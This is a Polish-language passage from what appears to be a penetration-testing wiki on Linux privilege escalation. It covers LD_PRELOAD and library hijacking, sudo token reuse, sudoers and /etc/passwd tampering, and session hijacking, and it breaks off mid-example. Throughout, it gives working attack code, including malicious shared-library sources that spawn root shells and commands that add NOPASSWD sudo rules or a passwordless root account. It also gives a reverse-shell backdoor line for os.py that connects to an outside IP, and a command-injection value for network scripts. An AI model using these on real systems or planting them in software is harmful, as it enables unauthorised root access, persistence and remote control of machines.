Zmienne środowiskowe **LD_PRELOAD** służy do wskazania jednej lub więcej współdzielonych bibliotek (plików .so), które mają zostać załadowane przez loader przed wszystkimi innymi, w tym standardową biblioteką C (`libc.so`). Proces ten nazywa się preloadowaniem biblioteki.

Jednak aby zachować bezpieczeństwo systemu i zapobiec nadużyciu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system wymusza określone warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, w których rzeczywisty identyfikator użytkownika (_ruid_) nie jest zgodny z efektywnym identyfikatorem użytkownika (_euid_).
- Dla plików wykonywalnych z suid/sgid preloadowane są tylko biblioteki ze standardowych ścieżek, które również mają suid/sgid.

Privilege escalation może wystąpić, jeśli masz możliwość wykonywania komend z `sudo`, a wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala zmiennej środowiskowej **LD_PRELOAD** przetrwać i zostać rozpoznaną nawet wtedy, gdy komendy są uruchamiane przez `sudo`, co może prowadzić do wykonania arbitralnego kodu z podniesionymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Potem **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na końcu, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może zostać wykorzystany, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binarne SUID – .so injection

Gdy napotkasz binarkę z uprawnieniami **SUID**, która wydaje się nietypowa, dobrą praktyką jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Można to zweryfikować, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjał do exploitation.

Aby to exploitować, należałoby utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulację uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku współdzielonego (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na końcu uruchomienie podatnego binarnego pliku SUID powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy binarkę SUID ładującą bibliotekę z folderu, do którego możemy pisać, utwórzmy bibliotekę w tym folderze z odpowiednią nazwą:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd, taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
że to oznacza, że biblioteka, którą wygenerowałeś, musi mieć funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to kuratowana lista binarek Unix, które mogą być wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) jest tym samym, ale dla przypadków, gdy można **tylko wstrzykiwać argumenty** do polecenia.

Projekt zbiera legalne funkcje binarek Unix, które mogą być nadużyte do ucieczki z ograniczonych shelli, eskalacji lub utrzymania podwyższonych uprawnień, transferu plików, uruchamiania bind i reverse shelli oraz wykonywania innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli możesz uzyskać dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajduje sposób na wykorzystanie dowolnej reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **dostęp do sudo**, ale nie masz hasła, możesz eskalować uprawnienia przez **oczekiwanie na wykonanie komendy sudo i przejęcie tokenu sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" **użył `sudo`** do wykonania czegoś w **ostatnich 15 min** (domyślnie tyle trwa token sudo, który pozwala używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępne (możesz je wgrać)

(Możesz tymczasowo włączyć `ptrace_scope` poleceniem `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` albo trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Pierwszy exploit** (`exploit.sh`) utworzy binarkę `activate_sudo_token` w _/tmp_. Możesz jej użyć, aby **aktywować token sudo w swojej sesji** (nie dostaniesz automatycznie roota, użyj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) utworzy shell `sh` w _/tmp_ **należący do root z setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **tokeny sudo będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub w którymkolwiek z utworzonych plików wewnątrz folderu, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) do **utworzenia sudo token dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez potrzeby znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytane tylko przez user root i group root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać kilka interesujących informacji**, a jeśli możesz **zapisać** jakikolwiek plik, będziesz w stanie **eskalować privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz pisać, możesz nadużyć tego uprawnienia
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarnego `sudo`, takie jak `doas` dla OpenBSD, pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Hijacking Sudo

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do podnoszenia uprawnień, a ty uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny `sudo`**, który uruchomi twój kod jako root, a potem komendę użytkownika. Następnie **zmodyfikuj $PATH** kontekstu użytkownika (na przykład dodając nową ścieżkę w .bash_profile), tak aby gdy użytkownik uruchomi sudo, uruchomił się twój plik wykonywalny sudo.

Zauważ, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Albo uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd są ładowane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` będą odczytywane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których **będą wyszukiwane** **libraries**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie szukał libraries w `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** do którejkolwiek ze wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnego pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnego folderu wskazanego przez plik konfiguracyjny w `/etc/ld.so.conf.d/*.conf`, może być w stanie podnieść uprawnienia.\
Zobacz, **jak wykorzystać tę błędną konfigurację** na następnej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/` zostanie ona użyta przez program w tym miejscu, zgodnie z tym, co określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities zapewniają **podzbiór dostępnych uprawnień root dla procesu**. To skutecznie rozbija root **privileges na mniejsze i wyróżnialne jednostki**. Każda z tych jednostek może być następnie niezależnie nadawana procesom. W ten sposób pełny zestaw uprawnień jest ograniczony, zmniejszając ryzyko exploita.\
Przeczytaj poniższą stronę, aby **dowiedzieć się więcej o capabilities i jak je abuse**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

W katalogu bit **"execute"** oznacza, że dotknięty użytkownik może wejść do folderu za pomocą "**cd**".\
Bit **"read"** oznacza, że użytkownik może **listować** **pliki**, a bit **"write"** oznacza, że może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) reprezentują drugą warstwę dyskrecjonalnych uprawnień, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do pliku lub katalogu, pozwalając przyznać lub odmówić praw konkretnym użytkownikom, którzy nie są właścicielami ani częścią grupy. Ten poziom **szczegółowości zapewnia bardziej precyzyjne zarządzanie dostępem**. Dalsze szczegóły można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** użytkownikowi "kali" uprawnienia do odczytu i zapisu do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL-ami z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Ukryty backdoor ACL w sudoers drop-ins

Częstą błędną konfiguracją jest plik w `/etc/sudoers.d/` należący do root, z trybem `440`, który mimo to daje dostęp do zapisu low-priv userowi przez ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Jeśli zobaczysz coś takiego jak `user:alice:rw-`, użytkownik może dodać regułę sudo mimo restrykcyjnych bitów trybu:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
To jest ścieżka trwałości/privesc o dużym wpływie, ponieważ łatwo ją przeoczyć w przeglądach opartych tylko na `ls -l`.

## Otwórz sesje shell

W **starych wersjach** możesz **hijack** niektóre sesje **shell** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **connect** się do sesji screen tylko swojego **własnego użytkownika**. Jednak możesz znaleźć **interesting information inside the session**.

### przejmowanie sesji screen

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Hijackowanie sesji tmux

Był to problem ze **starymi wersjami tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez root jako użytkownik bez uprawnień.

**Wyświetl sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, itp.) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym bugiem.\
Ten bug powstaje przy tworzeniu nowego klucza ssh w tych systemach, ponieważ **możliwe były tylko 32,768 warianty**. Oznacza to, że wszystkie możliwości można obliczyć i **mając publiczny klucz ssh możesz wyszukać odpowiadający mu private key**. Obliczone możliwości znajdziesz tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Określa, czy dozwolona jest uwierzytelnianie hasłem. Domyślnie jest `no`.
- **PubkeyAuthentication:** Określa, czy dozwolone jest uwierzytelnianie kluczem publicznym. Domyślnie jest `yes`.
- **PermitEmptyPasswords**: Gdy dozwolone jest uwierzytelnianie hasłem, określa, czy serwer pozwala na logowanie do kont z pustym hasłem. Domyślnie jest `no`.

### Login control files

Te pliki wpływają na to, kto może się logować i w jaki sposób:

- **`/etc/nologin`**: jeśli istnieje, blokuje logowania użytkowników innych niż root i wyświetla swoją wiadomość.
- **`/etc/securetty`**: ogranicza, skąd root może się logować (allowlist TTY).
- **`/etc/motd`**: baner po logowaniu (może leakować informacje o środowisku lub szczegóły konserwacji).

### PermitRootLogin

Określa, czy root może logować się przez ssh, domyślnie jest `no`. Możliwe wartości:

- `yes`: root może logować się używając hasła i private key
- `without-password` lub `prohibit-password`: root może logować się tylko używając private key
- `forced-commands-only`: Root może logować się tylko używając private key i jeśli opcje komend są określone
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające public key, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać absolute paths** (zaczynające się od `/`) albo **relative paths z katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się przy użyciu **private** key użytkownika "**testusername**", ssh porówna public key twojego key z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` oraz `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala **używać lokalnych SSH keys zamiast zostawiania keys** (bez passphrases!) na twoim serwerze. Dzięki temu będziesz mógł **przeskoczyć** przez ssh **na hosta** i stamtąd **przeskoczyć na kolejnego** hosta, **używając** **key** znajdującego się na twoim **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` tak:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` ma wartość `*`, za każdym razem, gdy użytkownik przeskakuje na inną maszynę, ten host będzie mógł uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** tę **opcję** i zezwolić lub odmówić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwolić** lub **odmówić** ssh-agent forwarding za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest dozwolone).

Jeśli zauważysz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać to do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Plik `/etc/profile` oraz pliki znajdujące się w `/etc/profile.d/` to **skrypty wykonywane, gdy użytkownik uruchamia nową powłokę**. Dlatego jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **wrażliwe szczegóły**.

### Passwd/Shadow Files

Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **find all of them** and **check if you can read** them to see **if there are hashes** inside the files:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** wewnątrz pliku `/etc/passwd` (lub jego odpowiednika)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z poniższych poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Dodaj następnie użytkownika `hacker` i ustaw wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np. `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Teraz możesz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć następujących linii, aby dodać fikcyjnego użytkownika bez hasła.\
OSTRZEŻENIE: możesz obniżyć bieżący poziom bezpieczeństwa maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a także `/etc/shadow` jest przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisywać do niektórych wrażliwych plików**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat w /etc/systemd/,** wtedy możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany przy następnym uruchomieniu tomcat.

### Check Folders

Następujące foldery mogą zawierać backupy lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/pliki owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki bazy danych Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), wyszukuje on **kilka możliwych plików, które mogą zawierać hasła**.\
**Kolejnym interesującym narzędziem** do tego jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), czyli aplikacja open source służąca do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux i Mac.

### Logi

Jeśli możesz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy jest log, tym bardziej interesujący będzie (prawdopodobnie).\
Ponadto niektóre "**źle**" skonfigurowane (z backdoorem?) **audit logs** mogą pozwolić Ci **rejestrować hasła** w audit logs, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie bardzo przydatna.

### Pliki shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w **nazwie** albo w **treści**, a także IP i e-maile w logach, lub regexy hashy.\
Nie będę tutaj opisywać, jak zrobić to wszystko, ale jeśli jesteś zainteresowany, możesz sprawdzić ostatnie testy, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Jeśli wiesz, **skąd** zostanie uruchomiony skrypt Pythona i **możesz zapisywać** w tym folderze albo **możesz modyfikować biblioteki Pythona**, możesz zmodyfikować bibliotekę OS i dodać do niej backdoor (jeśli możesz zapisywać tam, gdzie zostanie uruchomiony skrypt Pythona, skopiuj i wklej bibliotekę os.py).

Aby **dodać backdoor do biblioteki** po prostu dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation logrotate

Podatność w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** w pliku logu lub w jego katalogach nadrzędnych potencjalnie uzyskać podniesione uprawnienia. Dzieje się tak, ponieważ `logrotate`, często działający jako **root**, można zmanipulować tak, aby wykonywał dowolne pliki, zwłaszcza w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale też w każdym katalogu, w którym stosowana jest rotacja logów.

> [!TIP]
> Ta podatność dotyczy `logrotate` w wersji `3.18.0` i starszych

Bardziej szczegółowe informacje o tej podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Tę podatność możesz wykorzystać za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc za każdym razem, gdy odkryjesz, że możesz modyfikować logi, sprawdź, kto nimi zarządza, i sprawdź, czy możesz podnieść uprawnienia, podmieniając logi na symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencja do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegokolwiek powodu użytkownik może **zapisać** skrypt `ifcf-<cokolwiek>` do _/etc/sysconfig/network-scripts_ **lub** może **zmodyfikować** istniejący, to twój **system is pwned**.

Skrypty sieciowe, na przykład _ifcg-eth0_, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak na Linux są \~sourced\~ przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli w nazwie jest **biała/blank space** the system próbuje wykonać część po białej/blank space. Oznacza to, że **wszystko po pierwszej białej/blank space jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
